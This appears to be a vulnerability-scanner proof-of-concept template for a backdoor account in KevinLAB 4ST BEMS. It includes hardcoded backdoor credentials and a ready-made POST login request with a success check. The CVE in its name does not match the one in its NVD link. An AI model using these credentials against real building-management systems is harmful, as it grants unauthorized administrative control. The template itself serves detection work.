name: poc-yaml-kevinlab-bems-backdoor-cve-2021-37292
binding: 0f259d25-98f6-458d-9954-472a1a44143b
manual: true
detail:
    author: Aurora
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2021-3729
    description: <p>KevinLAB BEMS has an undocumented backdoor account, and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel, and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the BEMS is offering remotely.<br></p>
    extra:
        dock: body="requestUrl = '../http/index.php'"
        product: 4ST BEMS 1.0.0
        homepage: http://www.kevinlab.com
    vulnerability:
        id: CT-408960
        level: high
transport: http
payloads:
    continue: false
    payloads:
        p1:
            username: |
                "kevinlab"
            password: |
                "kevin003"
        p2:
            username: |
                "developer1"
            password: |
                1234
rules:
    r1:
        request:
            method: POST
            path: /http/index.php
            follow_redirects: false
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: requester=login&request=login&params=%5B%7B%22name%22%3A%22input_id%22%2C%22value%22%3A%22{{username}}%22%7D%2C%7B%22name%22%3A%22input_passwd%22%2C%22value%22%3A%22{{password}}%22%7D%5D
        expression: response.status == 200 && "{(.*)result['\"]\\s*:\\s*true(.*)}".bmatches(response.body)
expression: r1()
